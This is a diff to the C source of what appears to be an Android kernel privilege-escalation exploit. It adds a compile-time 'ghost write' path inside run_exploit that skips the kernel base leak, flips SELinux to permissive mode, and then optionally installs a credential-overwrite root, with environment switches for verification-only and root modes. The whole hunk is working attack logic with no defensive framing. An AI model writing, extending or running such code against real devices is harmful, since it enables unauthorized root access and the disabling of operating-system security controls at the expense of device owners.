@@ -415,15 +415,52 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
+#if defined(SELINUX_GHOST_WRITE) && SELINUX_GHOST_WRITE
+  /*
+   * Ghost-write path: do not run slide_leak_kernel_base() (the pselect
+   * physical-oracle route reboots on this kernel), and do not rely on the
+   * in-process tracefs leak (unreliable in this context).  The embedded
+   * selinux_permissive binary performs its own proven tracefs KASLR leak
+   * before the flip; just open the gate here.
+   */
+  kaslr_done = 1;
+  kaslr_base = KIMAGE_TEXT_BASE;
+  kaslr_slide = 0;
+  pr_info("ghost path: embedded binary performs its own KASLR leak\n");
+#else
   if (!slide_leak_kernel_base()) {
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
+#endif
   if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
                kaslr_base, kaslr_slide, slide_p0_offset);
     return 0;
   }
+
+#if defined(SELINUX_GHOST_WRITE) && SELINUX_GHOST_WRITE
+  /*
+   * Ghost-write path: flip SELinux permissive first, then continue
+   * into the full fops/physrw pipeline for the UMH root step.
+   */
+  if (ghost_selinux_permissive() != 0) {
+    pr_error("ghost selinux flip failed\n");
+    return 1;
+  }
+  pr_success("ghost selinux permissive, continuing to physrw pipeline\n");
+  if (getenv("GHOST_ONLY")) {
+    pr_success("ghost-only verification mode: selinux permissive, stopping\n");
+    return 0;
+  }
+  if (getenv("GHOST_ROOT")) {
+    pr_success("ghost root mode: installing cred-overwrite root\n");
+    int root_ok = ghost_install_root_cred();
+    pr_success("ghost root install result=%d\n", root_ok);
+    /* ghost_install_root_cred returns 0 on success, 1 on failure. */
+    return root_ok ? 1 : 0;
+  }
+#endif /* SELINUX_GHOST_WRITE */
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   if (!slide_p0_session_fresh) {
     pr_error("full route requires P0 discovery in the current exploit process; "
